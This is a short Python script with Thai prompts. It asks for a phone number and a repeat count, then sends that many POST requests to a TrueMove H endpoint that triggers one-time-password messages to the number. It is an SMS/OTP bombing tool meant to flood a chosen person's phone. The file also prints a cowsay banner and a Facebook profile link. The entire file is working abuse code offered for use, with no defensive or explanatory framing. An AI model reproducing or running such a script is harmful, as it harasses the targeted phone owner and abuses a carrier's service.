import requests
import os 
import sys
import cowsay

os.system ("clear")
cowsay.milk("EES")
print ("https://www.facebook.com/profile.php?id=100076528370815")
print (" ")
love=input("เบอร์ ")
ploy=int(input("จำนวน "))
for po in range(ploy):
    requests.post ("https://topping.truemoveh.com/api/get_request_otp",data={"mobile_number":love,})
    print ("รักพลอย",po)
